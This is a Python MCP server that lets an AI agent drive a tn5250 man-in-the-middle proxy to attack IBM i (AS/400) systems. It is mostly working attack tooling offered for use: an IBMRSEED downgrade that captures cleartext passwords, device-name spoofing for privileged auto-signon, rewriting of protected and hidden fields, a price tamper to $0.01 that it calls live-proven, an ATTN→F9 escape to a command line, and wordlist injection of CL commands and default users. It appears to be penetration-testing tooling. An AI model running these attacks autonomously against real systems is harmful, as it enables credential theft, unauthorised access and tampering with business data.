#!/usr/bin/env python3
"""
hack5250 MCP Server — IBM i (AS/400) Penetration Testing via tn5250 MITM

Exposes the hack5250 :52500 API as MCP tools so an AI agent can drive
the proxy autonomously.

Architecture:
    [AI agent] <--stdio--> [This MCP Server] <--TCP:52500--> [hack5250 Proxy] <--tn5250--> [IBM i]

Prerequisites:
    1. hack5250 running: `python hack5250/hack5250.py <ibmi_ip> 23 -n <project>`
    2. tn5250 emulator connected to 127.0.0.1:5251
    3. API automatically listening on 127.0.0.1:52500

This server is THIN — it speaks the line-based TCP protocol that
hack5250's ApiServer exposes. No protocol parsing here; that's all
in the proxy. We just translate MCP tool calls to API commands.
"""
import socket
import json
from typing import Optional

from mcp.server.fastmcp import FastMCP


# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

API_HOST = "127.0.0.1"
API_PORT = 52500
TIMEOUT = 5.0


# ---------------------------------------------------------------------------
# Thin TCP client for the :52500 line-based protocol
# ---------------------------------------------------------------------------

class Hack5250Client:
    """One-shot-per-call TCP client. The :52500 ApiServer is stateless
    per request, so we don't bother keeping a persistent socket."""

    def __init__(self, host: str = API_HOST, port: int = API_PORT):
        self.host = host
        self.port = port

    def call(self, command: str, args: str = "") -> str:
        """Send `<command> <args>\n`, return one line of response."""
        line = f"{command} {args}".strip() + "\n"
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(TIMEOUT)
        try:
            sock.connect((self.host, self.port))
            sock.sendall(line.encode("utf-8"))
            chunks = []
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                chunks.append(chunk)
                if b"\n" in chunk:
                    break
            return b"".join(chunks).decode("utf-8", errors="replace").rstrip("\n")
        finally:
            sock.close()

    def call_json(self, command: str, args: str = "") -> dict | list:
        resp = self.call(command, args)
        if resp.startswith("ERROR"):
            raise RuntimeError(resp)
        return json.loads(resp)


_client = Hack5250Client()


# ---------------------------------------------------------------------------
# MCP Server
# ---------------------------------------------------------------------------

mcp = FastMCP(
    "hack5250",
    instructions=(
        "IBM i (AS/400) penetration testing via tn5250 MITM proxy. "
        "First-ever 5250 field-attribute manipulation tool.\n\n"
        "Capabilities:\n"
        "- FFW (Field Format Word) bit manipulation: clear bypass/numeric/mandatory bits "
        "to make protected fields editable, reveal non-display fields\n"
        "- IBMRSEED downgrade: strip RFC 2877 seed to force cleartext password capture\n"
        "- DEVNAME spoofing: virtual device name injection for auto-signon attacks\n"
        "- ATTN escape: automate Silent Signal's menu-bypass technique (ATTN→F9→CL prompt)\n"
        "- SOH PF-mask analysis: find F-keys the host says are invalid (hidden handlers)\n"
        "- AID injection: F1-24, ROLLUP/DN, HELP, PRINT, CLEAR, PA1-3\n"
        "- Mask-template field injection with IBM i wordlists (CL commands, default users)\n\n"
        "Workflow: ping → get_screen → enable FFW hacks → send AIDs → check for findings.\n"
        "For credential capture: enable_ibmrseed_downgrade BEFORE the emulator connects."
    ),
)


# ===========================================================================
# Connection / health
# ===========================================================================

@mcp.tool()
def ping() -> str:
    """Health check. Returns 'pong' if the hack5250 proxy is alive on :52500.
    Run this first — if it fails, the proxy isn't running."""
    return _client.call("ping")


@mcp.tool()
def get_screen_text() -> str:
    """Get the current screen as a 24x80 text grid (newline-separated rows).
    This is what the emulator user sees, post-mutation."""
    return _client.call("get_screen_text")


@mcp.tool()
def get_screen_fields() -> list[dict]:
    """Get all fields on the current screen with their attributes.

    Returns: list of {row, col, length, protected, hidden, numeric}.
    These are the PARSED fields — protected/hidden flags reflect what
    the host SENT, not what the user sees (mutate may have flipped them).
    """
    return _client.call_json("get_fields")


@mcp.tool()
def get_pf_key_mask() -> dict:
    """Get the SOH PF-key mask — which F-keys the host says are valid.

    Returns: {"mask": "0xNNNNNN", "masked_keys": ["F1", "F4", ...]}.
    The masked_keys are the INTERESTING ones — the host says they're
    invalid, but the handler might still exist. Fuzz those first.
    """
    return _client.call_json("get_pf_mask")


@mcp.tool()
def log_count() -> int:
    """How many packets have been logged to the project SQLite db."""
    return int(_client.call("log_count"))


# ===========================================================================
# FFW manipulation — the novel attack
# ===========================================================================

@mcp.tool()
def enable_ffw_unprotect() -> str:
    """Clear the FFW BYPASS bit (0x2000) on all fields. Protected fields
    become editable in the emulator.

    THE ATTACK: 5250 hosts trust the terminal to enforce field protection.
    With the bypass bit cleared, you can type into "read-only" fields.
    If the host doesn't re-validate on RECEIVE, you've changed protected
    data (account numbers, prices, routing codes).

    Effect persists until disable_ffw_unprotect. Applies to all
    subsequent host→client traffic.
    """
    return _client.call("ffw_unprotect", "on")


@mcp.tool()
def disable_ffw_unprotect() -> str:
    """Restore normal FFW BYPASS handling."""
    return _client.call("ffw_unprotect", "off")


@mcp.tool()
def enable_ffw_reveal_hidden() -> str:
    """Rewrite screen-attribute 0x27 (NONDISP) to 0x20 (green). Hidden
    fields become visible in the emulator.

    Use this to see passwords, session tokens, internal state that the
    app hides via DDS DSPATR(ND).
    """
    return _client.call("ffw_reveal_hidden", "on")


@mcp.tool()
def disable_ffw_reveal_hidden() -> str:
    return _client.call("ffw_reveal_hidden", "off")


@mcp.tool()
def enable_ffw_remove_numeric() -> str:
    """Clear FFW shift bits (numeric-only enforcement) plus mandatory-entry
    and field-exit-required bits. Lets you type alpha into numeric fields.

    Tests whether RPG/COBOL re-validates the data type or trusts the
    terminal's enforcement.
    """
    return _client.call("ffw_remove_numeric", "on")


@mcp.tool()
def disable_ffw_remove_numeric() -> str:
    return _client.call("ffw_remove_numeric", "off")


@mcp.tool()
def enable_ffw_high_visibility() -> str:
    """When reveal_hidden is on, use white instead of green for revealed
    fields. Makes them stand out more in the emulator."""
    return _client.call("ffw_high_visibility", "on")


@mcp.tool()
def disable_ffw_high_visibility() -> str:
    return _client.call("ffw_high_visibility", "off")


@mcp.tool()
def get_ffw_status() -> dict:
    """Current state of all FFW manipulation toggles.

    Returns: {"unprotect": bool, "reveal_hidden": bool,
              "remove_numeric": bool, "high_visibility": bool}
    """
    return _client.call_json("ffw_status")


# ===========================================================================
# Negotiation attacks (IBMRSEED, DEVNAME)
# ===========================================================================

@mcp.tool()
def enable_ibmrseed_downgrade() -> str:
    """Strip the RFC 2877 IBMRSEED seed from server→client negotiation.

    THE ATTACK: tn5250E auto-signon encrypts the password using a server
    seed. RFC 2877 §5 says the CLIENT decides whether to encrypt — based
    on whether it received a seed. Strip the seed → client falls back to
    CLEARTEXT password in IBMSUBSPW.

    IMPORTANT: This only works on the NEXT reconnect. The seed exchange
    happens during telnet negotiation, before the 5250 datastream starts.
    Enable this, then have the emulator disconnect and reconnect.

    After reconnect, check get_captured_credentials.
    """
    return _client.call("ibmrseed_downgrade", "on")


@mcp.tool()
def disable_ibmrseed_downgrade() -> str:
    return _client.call("ibmrseed_downgrade", "off")


@mcp.tool()
def get_captured_credentials() -> list[list[str]]:
    """Cleartext credentials captured via IBMRSEED downgrade.

    Returns: list of [user, password] pairs. Empty until the downgrade
    succeeds AND the emulator reconnects with auto-signon enabled.
    """
    return _client.call_json("get_captured_creds")


@mcp.tool()
def spoof_device_name(name: str) -> str:
    """Rewrite the DEVNAME USERVAR in client→server negotiation.

    THE ATTACK: IBM i can bind device descriptions to user profiles
    (CRTDEVDSP USRPRF(...)). If you spoof a device name that's bound
    to a privileged profile, you may get auto-signed-on as that user.

    Common targets: QPADEV0001-99 (auto-created virtuals), CONSOLE,
    DSP01-10. See injections/device-names.txt for the full list.

    Like IBMRSEED, this only takes effect on the NEXT reconnect.
    """
    return _client.call("devname_spoof", name)


@mcp.tool()
def clear_device_name_spoof() -> str:
    """Stop spoofing — let the emulator's real device name through."""
    return _client.call("devname_spoof", "")


@mcp.tool()
def get_negotiation_status() -> dict:
    """Current negotiation attack state.

    Returns: {"force_cleartext": bool, "spoof_device_name": str|None,
              "stripped_seed": str|None}.
    stripped_seed (hex) is non-null if the proxy actually intercepted
    a seed — that confirms the downgrade fired.
    """
    return _client.call_json("nego_status")


# ===========================================================================
# AID injection
# ===========================================================================

@mcp.tool()
def list_aid_keys() -> list[str]:
    """All AID key names accepted by send_aid.

    5250 has: F1-F24, ENTER, ROLLUP, ROLLDN, HELP, PRINT, CLEAR,
    PA1-PA3, RECBS, AUTO. Note: 5250 ENTER is 0xF1 (which is PF1 in 3270).
    """
    return _client.call_json("list_aids")


@mcp.tool()
def send_aid(key_name: str) -> str:
    """Send an AID key to the host as if the user pressed it.

    Examples: send_aid("F3"), send_aid("ENTER"), send_aid("ROLLUP").
    See list_aid_keys for valid names.
    """
    return _client.call("send_aid", key_name)


@mcp.tool()
def send_field(row: int, col: int, text: str, aid: str = "ENTER") -> str:
    """Write text into a field position and send the AID. Bypasses the emulator.

    THE WORKHORSE for menu-driven pentesting:
      send_field(20, 17, "1")  → type option 1, press ENTER

    For PROTECTED-FIELD TAMPERING: give it a protected field's coords.
    The packet's SBA points there; if the host's RECEIVE doesn't validate
    SBA addresses against the format table, the protected data is
    overwritten.

    Live-proven (Mels Cargo, 2026-04-08): writing to a protected price
    field at r9c21 persisted "$0.01129.59" to the order database.

    Note: text may not fully overwrite a longer existing field value
    (5250 doesn't auto-clear). Pad to field length or send a clear key
    first if you need a clean write.
    """
    return _client.call("send_field", f"{row} {col} {text} {aid}")


@mcp.tool()
def send_fields(fields: list[list], aid: str = "ENTER",
                cursor: list[int] | None = None) -> dict:
    """Send MULTIPLE fields in one packet — the full tampering attack.

    fields: list of [row, col, text]. Each becomes an SBA + EBCDIC pair.
    cursor: [row, col] for the inbound packet. Defaults to first field.

    THE COMBINED ATTACK: include the legit input field AND extra SBA
    pairs at protected positions. The host can't tell which pairs are
    "supposed" to be there.

    Example — order item AND tamper its item number simultaneously:
      send_fields([
        [20, 19, "Y"],      # Order Supply (legit input field)
        [5, 20, "99999"],   # Item # (protected — tampering)
      ])

    Returns: {"sent": true, "packet_hex": "...", "field_count": N}
    """
    req: dict = {"fields": fields, "aid": aid}
    if cursor is not None:
        req["cursor"] = cursor
    import json as _json
    return _client.call_json("send_fields", _json.dumps(req))


@mcp.tool()
def send_raw_hex(hex_bytes: str) -> dict:
    """Send raw bytes (hex-encoded) directly to the host. Escape hatch.

    No validation, no header building. Use this for hand-crafted 5250
    packets that send_field/send_fields can't express. Spaces in the
    hex string are stripped for readability.

    Example:
      send_raw_hex("000d 12a0 0000 0400 0003 0101 35 ffef")  # F5

    Returns: {"sent": true, "bytes": N}
    """
    return _client.call_json("send_raw_hex", hex_bytes)


@mcp.tool()
def send_attn() -> str:
    """Send the ATTN (Attention) key — header flag bit, not an AID.

    THE ESCAPE: ATTN interrupts the running program. Default behavior
    drops you to the Operational Assistant menu. From there, F9 brings
    up a CL command line — bypassing menu-based security entirely.

    This is Silent Signal's documented technique. Whether it works
    depends on whether the user profile's ATNPGM has been overridden
    (most shops don't bother).

    After this, call get_screen_text to see what came back. Look for
    "Operational Assistant" or "===>" (already at command line).
    """
    return _client.call("send_attn")


@mcp.tool()
def send_masked_keys() -> dict:
    """Send every F-key the host's SOH PF-mask says is INVALID.

    These are the keys to fuzz — if a handler exists for a key the
    host claims is invalid, the developer forgot to remove it.

    Returns: {"sent": ["F1", "F4", ...], "count": N}.
    """
    masked = _client.call_json("get_masked_keys")
    sent = []
    for key in masked:
        try:
            _client.call("send_aid", key)
            sent.append(key)
        except Exception:
            pass
    return {"sent": sent, "count": len(sent)}


# ===========================================================================
# Mask-template field injection
# ===========================================================================

@mcp.tool()
def arm_mask_capture() -> str:
    """Arm the proxy to capture the next inbound packet as an injection
    template.

    WORKFLOW:
    1. Call this to arm
    2. In the emulator, type **** in the target field, press Enter
    3. Proxy intercepts that packet, finds the **** run, splits into
       preamble/mask/postamble
    4. Call get_mask_status to confirm capture
    5. Call inject_word to substitute payloads

    The packet is consumed (not forwarded) — the host never sees the ****.
    """
    return _client.call("mask_arm")


@mcp.tool()
def get_mask_status() -> dict:
    """Check if a mask template has been captured.

    Returns: {"ready": bool, "mask_len": int, "preamble_len": int,
              "postamble_len": int}.
    ready=True means inject_word will work.
    """
    return _client.call_json("mask_status")


@mcp.tool()
def inject_word(word: str, mode: str = "TRUNC") -> str:
    """Substitute a payload into the captured mask template and send it.

    mode:
      TRUNC    — pad with EBCDIC space or truncate to mask_len
      SKIP     — skip if word > mask_len (returns ERROR)
      OVERFLOW — send full word regardless (tests pre-truncation validation)

    Common workflow: iterate injections/cl-commands.txt with this.
    Try WRKACTJOB, DSPSYSVAL QSECURITY, CALL QCMD.
    """
    return _client.call("inject_word", f"{word} {mode}")


@mcp.tool()
def inject_wordlist(wordlist_name: str, mode: str = "TRUNC",
                    max_words: int = 100) -> dict:
    """Iterate a wordlist file through inject_word.

    wordlist_name: filename in hack5250/injections/ (e.g. 'cl-commands.txt',
                   'ibmi-default-users.txt', 'device-names.txt')

    Returns: {"injected": N, "errors": [...], "last_word": str}.
    Mask must be captured first (arm_mask_capture).
    """
    import pathlib
    wordlist_path = (pathlib.Path(__file__).parent.parent.parent /
                     "injections" / wordlist_name)
    if not wordlist_path.exists():
        return {"error": f"wordlist not found: {wordlist_path}"}

    status = _client.call_json("mask_status")
    if not status.get("ready"):
        return {"error": "mask not captured — call arm_mask_capture first"}

    words = []
    with open(wordlist_path) as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                words.append(line)
    words = words[:max_words]

    injected = 0
    errors = []
    last = ""
    for w in words:
        resp = _client.call("inject_word", f"{w} {mode}")
        last = w
        if resp.startswith("ERROR"):
            errors.append(f"{w}: {resp}")
        else:
            injected += 1

    return {"injected": injected, "errors": errors[:5],
            "total_errors": len(errors), "last_word": last}


# ===========================================================================
# Pen test workflows (compound tools)
# ===========================================================================

@mcp.tool()
def quick_recon() -> dict:
    """Initial reconnaissance — read the screen, enumerate fields,
    check PF-key mask, count logs.

    Run this after connecting to get oriented.
    """
    return {
        "screen_preview": _client.call("get_screen_text")[:200],
        "fields": _client.call_json("get_fields"),
        "pf_mask": _client.call_json("get_pf_mask"),
        "ffw_status": _client.call_json("ffw_status"),
        "negotiation": _client.call_json("nego_status"),
        "log_count": int(_client.call("log_count")),
    }


@mcp.tool()
def enable_all_ffw_hacks() -> dict:
    """Turn on every FFW manipulation: unprotect, reveal hidden,
    remove numeric, high visibility. The full attack."""
    _client.call("ffw_unprotect", "on")
    _client.call("ffw_reveal_hidden", "on")
    _client.call("ffw_remove_numeric", "on")
    _client.call("ffw_high_visibility", "on")
    return _client.call_json("ffw_status")


@mcp.tool()
def disable_all_ffw_hacks() -> dict:
    """Turn off every FFW manipulation. Restore normal behavior."""
    _client.call("ffw_unprotect", "off")
    _client.call("ffw_reveal_hidden", "off")
    _client.call("ffw_remove_numeric", "off")
    _client.call("ffw_high_visibility", "off")
    return _client.call_json("ffw_status")


@mcp.tool()
def select_menu_option(option: str, input_row: int = 20,
                       input_col: int = 17, clear_first: bool = True) -> dict:
    """Type an option number into a menu's input field, press ENTER.

    Convenience wrapper for the most common send_field pattern.
    Defaults to (20, 17) — Mels Cargo's main menu input position.
    Adjust for other apps.

    clear_first: send F5 before the option to refresh the menu and
    clear stale field content. Without this, single-char options may
    not fully overwrite multi-char leftovers (live finding 2026-04-08:
    sending "1" after "11" left "11" in a 2-char field).

    Returns: {"option": str, "screen_title": str, "navigated": bool}
    """
    import time
    if clear_first:
        _client.call("send_aid", "F5")
        time.sleep(0.6)
    _client.call("send_field", f"{input_row} {input_col} {option} ENTER")
    time.sleep(0.8)
    text = _client.call("get_screen_text")
    title = next((l.strip() for l in text.split("\n") if l.strip()), "")
    # Heuristic: if title changed from menu, we navigated
    navigated = "Main Menu" not in text
    return {"option": option, "screen_title": title[:60],
            "navigated": navigated}


@mcp.tool()
def tamper_protected_field(row: int, col: int, value: str,
                           legit_input_row: int, legit_input_col: int,
                           legit_input_value: str) -> dict:
    """The combined attack: legit input + protected-field tamper, one packet.

    Sends a packet with TWO SBA pairs:
      1. The legit input field (so the host processes the form normally)
      2. An extra SBA at a PROTECTED position (the tamper)

    If the host doesn't validate SBA addresses against the format table,
    both writes happen. The form submits AND the protected data changes.

    Live-proven (Mels Cargo): single-field price tamper persisted to DB.
    This is the multi-field version that the pen test couldn't drive
    until send_fields existed.

    Example — order item 1 but tamper its price to $0.01:
      tamper_protected_field(
        row=9, col=21, value="$0.01",          # protected price field
        legit_input_row=20, legit_input_col=19, # Order Supply field
        legit_input_value="Y",
      )
    """
    return send_fields(
        fields=[
            [legit_input_row, legit_input_col, legit_input_value],
            [row, col, value],
        ],
        aid="ENTER",
        cursor=[legit_input_row, legit_input_col],
    )


@mcp.tool()
def attempt_attn_escape() -> dict:
    """Full ATTN→F9 escape sequence with response classification.

    1. Send ATTN
    2. Wait briefly for response
    3. Check screen text for Operational Assistant / System Request / ===>
    4. If Operational Assistant: send F9
    5. Check again for ===>

    Returns: {"step": str, "result": str, "screen": str}.
    result is one of: CMDLINE (success), OPER_ASSIST (got menu, F9 next),
    SYS_REQUEST (alt menu), BLOCKED (ATNPGM overridden).
    """
    import time

    _client.call("send_attn")
    time.sleep(1.0)
    screen = _client.call("get_screen_text")

    if "===>" in screen:
        return {"step": "ATTN", "result": "CMDLINE",
                "screen": screen[:200],
                "note": "Already at command line — F9 not needed"}

    if "Operational Assistant" in screen:
        _client.call("send_aid", "F9")
        time.sleep(1.0)
        screen2 = _client.call("get_screen_text")
        if "===>" in screen2:
            return {"step": "F9", "result": "CMDLINE",
                    "screen": screen2[:200],
                    "note": "ATTN→F9 succeeded — CL command line reached"}
        return {"step": "F9", "result": "OPER_ASSIST",
                "screen": screen2[:200],
                "note": "Got Operational Assistant but F9 didn't yield prompt"}

    if "System Request" in screen:
        return {"step": "ATTN", "result": "SYS_REQUEST",
                "screen": screen[:200],
                "note": "System Request menu — try option 1 (alternate signon)"}

    return {"step": "ATTN", "result": "BLOCKED",
            "screen": screen[:200],
            "note": "ATNPGM overridden — ATTN handler intercepted"}


# ===========================================================================
# Entry point
# ===========================================================================

if __name__ == "__main__":
    mcp.run()
